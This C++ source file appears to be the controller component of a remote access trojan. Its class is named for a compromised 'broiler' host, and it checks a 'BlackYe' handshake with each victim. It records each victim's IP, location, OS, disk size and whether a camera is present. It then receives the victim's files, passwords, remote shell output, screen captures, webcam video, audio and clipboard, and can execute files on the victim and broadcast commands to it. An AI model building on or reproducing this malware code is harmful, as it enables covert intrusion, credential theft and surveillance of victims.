#include "StdAfx.h"
#include "BroilerData.h"
#include "Common.h"
#include "ModuleSocket.h"

#define CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

CBroilerData::CBroilerData(UINT id, SOCKET socket, sockaddr_in* serAddr, HWND hWnd)
{
	this->m_nId = id;
	this->m_socket = socket;
	this->m_hWnd = hWnd;
	m_pFileDlg = NULL;
	m_pCmdShellDlg = NULL;
	m_pSystemDlg = NULL;
	m_pChatDlg = NULL;
	m_pScreenDlg = NULL;
	m_pVideoDlg = NULL;
	m_pAudioDlg = NULL;
	m_pRemoteCmdDlg = NULL;
	m_pDesktopDlg = NULL;
	_CrtDumpMemoryLeaks();   //�ڴ�й©���
}

CBroilerData::~CBroilerData(void)
{
}

//////////////////////

void CBroilerData::OpenWorkThread()
{
	HANDLE hThread = CreateThread(0, 0, OnListenProc,(LPVOID)this,0, NULL);
	if (NULL != hThread)
	{
		::CloseHandle(hThread);
	}
}

DWORD WINAPI CBroilerData::OnListenProc(LPVOID lpParameter)
{
	CBroilerData* pThis = (CBroilerData*)lpParameter;
	ASSERT(pThis != NULL);
	bool bSuccess = true;  //��֤�Ƿ�ɹ�
    //CString strSingle = _T("BlackYe");
	const char *pSingle = "BlackYe";
	pThis->ShackHandCheck(pSingle, &bSuccess);
	if (bSuccess)
	{
		pThis->OnBeginListen();
	}
	return 0;
}

UINT32 CBroilerData::ShackHandCheck(IN const char* pSingle, OUT bool* pbSuccess )
{
	UINT32 result = ERROR_SUCCESS;
	if (NULL == pSingle || NULL == pbSuccess)
	{
		result = ERROR_INVALID_PARAMETER;
		return result;
	}
	bool bSuccess = true;
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));  //��ʼ��
	tagMsgInfo.nMsgCmd = CMD_SHAKEHAND;
	memcpy((char*)tagMsgInfo.context, (char*)pSingle, strlen(pSingle));
	try
	{
		result = m_ModuleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //������֤��Ϣ
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				while (true)
				{
					memset(&tagMsgInfo, 0, sizeof(MSGINFO));
					result = m_ModuleSocket.RecvCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
					if (bSuccess && CMD_SYSINFO == tagMsgInfo.nMsgCmd)
					{
						SYSTEMINFO sysInfo;
						memset(&sysInfo, 0 , sizeof(SYSTEMINFO));
						memcpy((char*)&sysInfo, (char*)tagMsgInfo.context, sizeof(SYSTEMINFO));
						//��֤�ɹ�
						m_strWANIP   =  CharToCString(sysInfo.szWANIP);
						m_strLocalIP =  CharToCString(sysInfo.szLocalIP);
						m_strRemark  =  CharToCString(sysInfo.hostName);
						m_strOSVersion = OSVersion(sysInfo.OSVer);
                        //��ȡ�����ַ					
						m_strCPU.Format(_T("%s"), sysInfo.szCPUInfo);
						m_QQwry.SetPath(_T("QQwry.dat"));
						CStringA strWANIP = CStrW2CStrA(m_strWANIP);
						CStringA strAddress = m_QQwry.IPtoAdd(strWANIP);
						m_strAddress = CStrA2CStrW(strAddress);
						//��ȡ�Ƿ�������ͷ
						m_bCam = sysInfo.Cam;
					    //��ȡӲ�̴�С
						DWORD dwDiskSize = sysInfo.dwDiskSize;
						m_strDiskSize.Format(_T("%dG"), dwDiskSize);
						//����������Ϣ
						::SendMessageW(this->m_hWnd, ID_MSG_ONLINE, (WPARAM)this, 0);   //����������Ϣ
						break;
					}
					else
					{
						bSuccess = false;
						throw result;
					}
				}
			}
		}
		else
		{
			bSuccess = false;
			throw result;
		}

	}
	catch (UINT32)
	{
	}
	*pbSuccess = bSuccess;
	return result;
}

void CBroilerData::OnBeginListen()
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));  //��ʼ��Ϊ0

	while (true)  //���ϼ���������Ƿ���������Ϣ�������
	{
		bool bSuccess = true;
		memset((char*)&tagMsgInfo, 0, sizeof(MSGINFO));  //��ʼ��Ϊ0
		UINT32 result = m_ModuleSocket.RecvCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
		memcpy((char*)&tagMsgInfo, (char*)&tagMsgInfo, sizeof(MSGINFO));
// 		if (!bSuccess)
// 		{
// 			if (WSAEWOULDBLOCK == result)
// 			{
// 				Sleep(50);
// 				continue;  //�����´�ѭ��
// 			}
// 			else
// 			{
// 				::closesocket(m_socket);  //�ر�socket����
// 				::SendMessageW(this->m_hWnd, ID_MSG_OFFLINE, this->m_nId, 0);   //��������֪ͨ
// 				break; //����ѭ��
// 			}
// 		}

		if (0 == tagMsgInfo.nMsgCmd) //���յ�������Ч�����ر�SOCKET����
		{
			::closesocket(m_socket);  //�ر�socket����
			::SendMessageW(this->m_hWnd, ID_MSG_OFFLINE, this->m_nId, 0);   //��������֪ͨ
			break; //����ѭ��
		}
		else   //�ɹ����յ�����
		{
			switch (tagMsgInfo.nMsgCmd)
			{
			case CMD_DISKINFO:    //ϵͳ��Ϣ
				{
					DRIVER_C tagDiskInfo = {0};
					//�������������ֽ������ȴ��ˣ����ջ�����������������û����������������
					memcpy((char*)&tagDiskInfo, (char*)tagMsgInfo.context, sizeof(DRIVER_C));  //��ֵ��������Ϣ�ṹ��
					m_pFileDlg->GetFileViewPoint()->SetDiskInfo(tagDiskInfo);  //�ڽ����Ͻ�������
				}
				break;
			case CMD_FILELIST:  //�ļ��б���Ϣ
				{
					FILEINFO_C tagFileInfo;  //�ļ���Ϣ
					memset(&tagFileInfo, 0, sizeof(FILEINFO_C));
					memcpy((char*)&tagFileInfo, (char*)&tagMsgInfo.context, sizeof(FILEINFO_C));
					m_pFileDlg->GetFileViewPoint()->SetFileListInfo(tagFileInfo);
				}
				break;
			case CMD_DOWNLOAD:  //�ļ�����
				{
					DOWNFILEDATA_C tagDownFileDat;
					memset(&tagDownFileDat, 0, sizeof(DOWNFILEDATA_C));
					memcpy((char*)&tagDownFileDat, (char*)tagMsgInfo.context, sizeof(DOWNFILEDATA_C));
					m_pFileDlg->GetFileTransPoint()->SetFileData(tagDownFileDat);
				}
				break;
			case CMD_FILEEXEC:  //�ļ�ִ��
				{
					FILEEXECINFO_C tagFileInfo;
					memset(&tagFileInfo, 0, sizeof(FILEEXECINFO_C));
					memcpy((char*)&tagFileInfo, (char*)tagMsgInfo.context, sizeof(FILEEXECINFO_C));
					m_pFileDlg->GetFileViewPoint()->SetFileExecInfo(tagFileInfo);
				}
				break;
			case CMD_REFRESH:  //ˢ��
				{
					FILEINFO_C tagFileInfo;  //�ļ���Ϣ
					memset(&tagFileInfo, 0, sizeof(FILEINFO_C));
					memcpy((char*)&tagFileInfo, (char*)&tagMsgInfo.context, sizeof(FILEINFO_C));
					m_pFileDlg->GetFileViewPoint()->SetFileListInfo(tagFileInfo);
				}
				break;
			case CMD_ATTRIBUTE:  //����
				{
					ATTRIBUTE_C tagArrti;
					memset(&tagArrti, 0, sizeof(ATTRIBUTE_C));
					memcpy((char*)&tagArrti, (char*)tagMsgInfo.context, sizeof(ATTRIBUTE_C));
					m_pFileDlg->GetFileViewPoint()->SetArrtibuteInfo(tagArrti);
				}
				break;
			case CMD_TELNET:
				{
					if (NULL == m_pCmdShellDlg)
					{
						break;
					}
					COMMOND_C tagCmdInfo;
					memset(&tagCmdInfo, 0, sizeof(COMMOND_C));
					memcpy((char*)&tagCmdInfo, (char*)tagMsgInfo.context, sizeof(COMMOND_C));
					m_pCmdShellDlg->SetReturnInfo(tagCmdInfo);
				}
				break;
			case CMD_CHATMSG:  //��ʹ����
				{
					CHATMSG_C tagChatMsg;
					memset(&tagChatMsg, 0, sizeof(CHATMSG_C));
					memcpy((char*)&tagChatMsg, (char*)tagMsgInfo.context, sizeof(CHATMSG_C));
					m_pChatDlg->RecvChatMsg(tagChatMsg);
				}
				break;
			case CMD_PROGRESS:  //��ȡ������Ϣ
				{
					PROGRESS_C tagProInfo;
					memset(&tagProInfo, 0, sizeof(PROGRESS_C));
					memcpy((char*)&tagProInfo, (char*)tagMsgInfo.context, sizeof(PROGRESS_C));
					((CProgressDlg*)m_pSystemDlg->GeProgressPoint())->SetProcessInfo(tagProInfo);
				}
				break;
			case CMD_GETPWD:  //��ȡ�ʺ�����
				{
					READPSWDATA_C tagRPDATA;
					memset(&tagRPDATA, 0, sizeof(READPSWDATA_C));
					memcpy((char*)&tagRPDATA, (char*)tagMsgInfo.context, sizeof(READPSWDATA_C));
					((CReadPswDlg*)m_pSystemDlg->GetReadPswPoint())->SetReadPswInfo(tagRPDATA);
				}
				break;
			case CMD_SCREEN:  //��ȡ��Ļ��Ϣ
				{
					if (NULL == m_pScreenDlg)
					{
						break;
					}
					BMPDATA_C tagBmpData;
					memset(&tagBmpData, 0, sizeof(BMPDATA_C));
					memcpy((char*)&tagBmpData, (char*)tagMsgInfo.context , sizeof(BMPDATA_C));
					m_pScreenDlg->GetScreenDataInfo(tagBmpData);
				}
				break;
			case CMD_VIDEO_VIEW:  //������Ϣ
				{
					if (NULL == m_pVideoDlg)
					{
						break;
					}
					VIDEODATA_C tagVideoData;
					memset(&tagVideoData, 0, sizeof(VIDEODATA_C));
					memcpy((char*)&tagVideoData, (char*)tagMsgInfo.context, sizeof(VIDEODATA_C));
					m_pVideoDlg->RecvVideo(tagVideoData);
				}
				break;
			case CMD_AUDIO:  //����
				{
					if (NULL == m_pAudioDlg)
					{
						break;
					}
					AUDIODATA_C tagAudioData;
					memset(&tagAudioData, 0, sizeof(AUDIODATA_C));
					memcpy((char*)&tagAudioData, (char*)tagMsgInfo.context, sizeof(AUDIODATA_C));
					m_pAudioDlg->RecvAudioData(tagAudioData);
				}
				break;
			case CMD_BROADCAST:  //Զ������㲥
				{
					if (NULL == m_pRemoteCmdDlg)
					{
						break;
					}
					wchar_t szContent[512] = {0};
					memcpy((char*)szContent, (char*)tagMsgInfo.context, sizeof(szContent));
					m_pRemoteCmdDlg->UpDateStatusBar(szContent);
				}
				break;
			case CMD_DESKTOP:  //������
				{
					if (NULL == m_pDesktopDlg)
					{
						break;
					}
				    CLIPBOARD_C tagClipBoard;
					memset(&tagClipBoard, 0, sizeof(CLIPBOARD_C));
					memcpy((char*)&tagClipBoard, (char*)tagMsgInfo.context, sizeof(CLIPBOARD_C));
					m_pDesktopDlg->SetClipBoardContext(tagClipBoard);
				}
				break;
			default:
				break;
			}
		}
	}
}

CString CBroilerData::CharToCString(char* result)
{
	//��char ת��Ϊ CString�ַ�
	DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, result, -1, NULL, 0);
	wchar_t *pwText;
	pwText = new wchar_t[dwNum];
	if (!pwText)
	{
		delete []pwText;
		return NULL;
	}
	MultiByteToWideChar (CP_ACP, 0, result, -1, pwText, dwNum);// ��ʼת��
	CString cstr = pwText;
	delete pwText;
	return cstr;
}

//
// CStringWתCStringA
//
CStringA CBroilerData::CStrW2CStrA(const CStringW &cstrSrcW)
{
	int len = WideCharToMultiByte(CP_ACP, 0, LPCWSTR(cstrSrcW), -1, NULL, 0, NULL, NULL);
	char *str = new char[len];
	memset(str, 0, len);
	WideCharToMultiByte(CP_ACP, 0, LPCWSTR(cstrSrcW), -1, str, len, NULL, NULL);
	CStringA cstrDestA = str;
	delete[] str;
	return cstrDestA;
}

//
// CStringAתCStringW  Unicode������
//
CStringW CBroilerData::CStrA2CStrW(const CStringA &cstrSrcA)
{
	int len = MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, NULL, 0);
	wchar_t *wstr = new wchar_t[len];
	memset(wstr, 0, len*sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, wstr, len);
	CStringW cstrDestW = wstr;
	delete[] wstr;
	return cstrDestW;
}


CString CBroilerData::OSVersion(IN int sysVer)
{
	CString strOSVersion = _T("");
	switch (sysVer)
	{
	case OS_2000:
		strOSVersion = _T("Windows 2000");
		break;
	case OS_XP:
		strOSVersion = _T("Windows XP");
		break;
	case OS_2003:
		strOSVersion = _T("Windows 2003 Server");
		break;
	case OS_Vista:
		strOSVersion = _T("Windows Vista");
		break;
	case OS_WIN7:
		strOSVersion = _T("Windows 7");
		break;
	case OS_WIN8:
		strOSVersion = _T("Windows 8");
		break;
	case OS_UNKNOWN:
		strOSVersion = _T("δ֪�汾");
		break;
	default:
		break;
	}
	return strOSVersion;
}

//////////////////////////////////////////

//�ļ�����
void CBroilerData::RunToFileManager()
{
	if (NULL == m_pFileDlg)
	{
		m_pFileDlg = new CFileManager(this, m_socket);
		m_pFileDlg->Create(IDD_DLG_FILE, this);
		m_pFileDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pFileDlg->SetActiveWindow();  //���ûҳ��
	}
}

void CBroilerData::RunToScreenManager()
{
	if (NULL == m_pScreenDlg)
	{
		m_pScreenDlg = new CScreenDlg(this, m_socket);
		m_pScreenDlg->Create(IDD_DLG_SCREEN, this);
		m_pScreenDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pScreenDlg->SetActiveWindow();  //���ûҳ��
	}
}

//ϵͳ����(���̡�����)
void CBroilerData::RunToSystemManager()
{
	if (NULL == m_pSystemDlg)
	{
		m_pSystemDlg = new CSystemManager(this, m_socket);
		m_pSystemDlg->Create(IDD_DLG_SYSTEM, this);
		m_pSystemDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pSystemDlg->SetActiveWindow();  //���ûҳ��
	}
}

//Զ���ն�
void CBroilerData::RunToCMDShellManager()
{
	if (NULL == m_pCmdShellDlg)
	{
		m_pCmdShellDlg = new CCmdShell(this, m_socket, m_strLocalIP);
		m_pCmdShellDlg->Create(IDD_DLG_TELNET, this);
		m_pCmdShellDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pCmdShellDlg->SetActiveWindow();  //���ûҳ��
	}
}

//����ͷ
void CBroilerData::RuntToVideoManager()
{
	if (NULL == m_pVideoDlg)
	{
		m_pVideoDlg = new CVideoDlg(this, m_socket);
		m_pVideoDlg->Create(IDD_DLG_VIDEO, this);
		m_pVideoDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pVideoDlg->SetActiveWindow();  //���ûҳ��
	}
}

//�������Ҽ��˵�

//��ʹ����
void CBroilerData::RunToChatMsgManager()
{
	if (NULL == m_pChatDlg)
	{
		m_pChatDlg = new CChatDlg(this, m_socket, m_strLocalIP);
		m_pChatDlg->Create(IDD_DLG_CHAT, this);
		m_pChatDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pChatDlg->SetActiveWindow();  //���ûҳ��
	}
}

void CBroilerData::RunToOperatorManager(IN const int nType)
{
	OPERATOR_C tagOperator;
	memset(&tagOperator, 0, sizeof(OPERATOR_C));
	tagOperator.nType = nType;  //��������

	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_OPERATOR;
	memcpy((char*)tagMsgInfo.context, (char*)&tagOperator, sizeof(OPERATOR_C));
	bool bSuccess = true;
	m_ModuleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

void CBroilerData::RunToAudioManager()
{
	if (NULL == m_pAudioDlg)
	{
		m_pAudioDlg = new CAudioDlg(this, m_socket);
		m_pAudioDlg->Create(IDD_DLG_AUDIO, this);
		m_pAudioDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pAudioDlg->SetActiveWindow();  //���ûҳ��
	}
}

void CBroilerData::RunToRemoteCmdManager()
{
	if (NULL == m_pRemoteCmdDlg)
	{
		m_pRemoteCmdDlg = new CRemoteCmdDlg(this, m_socket);
		m_pRemoteCmdDlg->Create(IDD_DLG_BROADCAST, this);
		m_pRemoteCmdDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pRemoteCmdDlg->SetActiveWindow();  //���ûҳ��
	}
}

void CBroilerData::RunToDesktopManager()
{
	if (NULL == m_pDesktopDlg)
	{
		m_pDesktopDlg = new CDesktopDlg(this, m_socket, m_strLocalIP);
		m_pDesktopDlg->Create(IDD_DLG_DESKTOP, this);
		m_pDesktopDlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_pDesktopDlg->SetActiveWindow();  //���ûҳ��
	}
}
